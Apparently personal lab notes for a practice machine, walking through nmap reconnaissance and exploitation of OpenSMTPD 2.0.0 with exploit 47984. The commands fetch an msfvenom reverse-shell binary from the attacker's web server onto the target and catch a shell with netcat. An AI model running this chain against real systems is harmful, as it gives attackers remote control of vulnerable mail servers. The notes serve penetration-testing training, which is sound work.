Foothold

Foothold 

1. Get closed and open ports using SYN Stealth scan. 
`sudo nmap -p- 192.168.182.71`
![5ad2cbc5e86285193521c1a1a96b6c36.png](../../../../_resources/9450c11fd26d47c6956c9f6f0522c81d.png)

We find open ports 22,25,445. Port 53 is closed


2. Scan only the open ports (22,25,445) for service detection
`sudo nmap -p22,25,80,445 -sV 192.168.182.71`
![bb678891f3296481d6835b55f9bb7026.png](../../../../_resources/b459e3ee82b049ffba79e57624d8feeb.png)

We find that port 25 OpenSMTPD is missing the version number still. Port 445 only has a range of version number 3.x - 4.x


3. Run aggressive scan on the open ports
`sudo nmap -p22,25,80,445 -A 192.168.182.71`
![bee8308f0d8adc8ca05fe60c9803d4b9.png](../../../../_resources/3b7f5892339c4c10ab110dd1a8cdfd99.png)
![a4191a14434259f06cca7803bb4b212d.png](../../../../_resources/5806d3265c8f415980c6071dde6eb55c.png)

We see versions:
-OpenSMPTD 2.0.0
-Samba smbd 4.7.6-Ubuntu


4. Run the Nmap NSE scripts for default,safe,auth,vuln
`sudo nmap -p22,25,80,445 --script default,safe,auth,vuln, 192.168.182.71`
![ccfacaab83bd94f522e0aa7229ab684c.png](../../../../_resources/ee07503c0122466cb6a668a097e08beb.png)
![b5781d73e86453de1d2e922d5da8aaef.png](../../../../_resources/9ff943ca7f9f483980d366564e452f21.png)
![3c4db6980ea1de32c451011ecfe7a56a.png](../../../../_resources/c4d82b8be804448d90d3c666a28a477b.png)


5. searchsploit opensmtpd
`searchsploit opensmtpd`
![fee8a95e78f28d99f544b9c05345dc68.png](../../../../_resources/011358aeebba4c6abff5a1f5b2c84031.png)


6. Download the 47984 remote code execution exploit
`searchsploit -m 47984`


7. Run to find out usage
```plaintext
python3 47984.py
kali@kali:~/gitWorkspace/pgp/Bratarina$ python3 47984.py 
Usage 47984.py <target ip> <target port> <command>
E.g. 47984.py 127.0.0.1 25 'touch /tmp/x'
```
![678cc427f966259b58bbbd02a923066b.png](../../../../_resources/d15957561d5847a39d7872217260e695.png)


8. See if it will connect to our Kali machine to download a simple file hello.txt

-this exploit did not work on default port 8000 for python3 -m http.server
-staged payload did not work


9. Start apache server on Kali
`sudo systemctl start apache2`


10. Run the exploit which attempts to access hello.txt on Kali
`python3 47984.py 192.168.200.71 25 'wget 192.168.49.200/hello.txt'`


11. Verify that the request was made on Apache log
`sudo tail /var/log/apache2/access.log`


12. Create payload. We see the following listed as a Linux payload on https://book.hacktricks.xyz/shells/shells/untitled
`msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp lhost=192.168.49.200 lport=445 -f elf > linux_x64_shellReverseTcp_192.168.49.200_445.elf`


13. Move the payload to Apache /var/www/html
`sudo mv linux_x64_shellReverseTcp_192.168.49.200_445.elf /var/www/html`


14. Restart Apache
`sudo systemctl start apache2`


15. Attempt to download the payload
`python3 47984.py 192.168.200.71 25 'wget 192.168.49.200/linux_x64_shellReverseTcp_192.168.49.200_445.elf'`


16. Verify it was downloaded
`sudo cat /var/log/apache2/access.log`
![315e89db879bfd6f6ca75fbf687a4a3f.png](../../../../_resources/925dfa51b0da4d72b827b7a776959ba5.png)


17. Make the payload executable
`python3 47984.py 192.168.200.71 25 'chmod +x linux_x64_shellReverseTcp_192.168.49.200_445.elf'`


18. Start a netcat listener on Kali port 445
`sudo nc -lnvp 445`


19. We have caught a shell
![6ca274a91a913a6f47a6a16e623d8fdd.png](../../../../_resources/191b6a7726a646c6a502fa9dce8b5dc4.png)
